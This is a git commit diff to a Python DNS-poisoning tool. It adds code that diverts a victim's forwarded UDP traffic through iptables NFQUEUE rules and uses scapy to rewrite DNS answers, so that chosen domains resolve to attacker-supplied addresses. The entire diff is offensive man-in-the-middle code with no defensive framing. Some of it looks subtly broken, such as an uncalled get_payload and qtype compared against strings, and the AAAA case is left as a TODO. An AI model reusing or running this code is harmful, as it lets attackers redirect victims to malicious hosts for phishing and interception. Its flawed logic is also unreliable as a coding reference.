82e7fdaca5f957e2acc85565364bc0ae49774e5e
Lars Hollander <larshollander@proton.me>
2024-05-23 11:22:39 +0200

    basic mitm-based dns poisoning (may or may not work)

--- dns_poisoning.py
+++ dns_poisoning.py
@@ -5,14 +5,14 @@ import os
 
 class DnsPoisoner(multiprocessing.Process):
 
-    def __init__(self, ip, queue_num):
+    def __init__(self, ip_victim, queue_num):
 
         multiprocessing.Process.__init__(self)
 
         self.urls_to_spoof = {}
         self.queue         = NetfilterQueue()
-        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip, queue_num)
-        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip, queue_num)
+        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
+        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)
         self.exit          = False
 
         self.queue.bind(queue_num, self.handle_packet)
@@ -20,9 +20,27 @@ class DnsPoisoner(multiprocessing.Process):
     def add_url(self, url, ip):
         self.urls_to_spoof[url] = ip
 
-    def handle_packet(self, packet):
+    def handle_packet(self, packet_nfqueue):
 
-        packet_scapy = IP(packet.get_payload)
+        packet_scapy = IP(packet_nfqueue.get_payload)
+        
+        if packet_scapy.haslayer(DNSRR):
+            packet_scapy = self.edit_dnsrr(packet_scapy)
+            packet_nfqueue.set_payload(bytes(packet_scapy))
+
+        packet_nfqueue.accept()
+
+    def edit_dnsrr(self, packet):
+
+        if packet[DNSQR].qname in self.urls_to_spoof.keys():
+            
+            if packet[DNSQR].qtype == "A":
+                packet[DNSRR].rdata = self.urls_to_spoof[packet[DNSQR].qname]
+            
+            if packet[DNSQR].qtype == "AAAA":
+                pass # TODO
+
+        return packet
 
     def run(self):
 
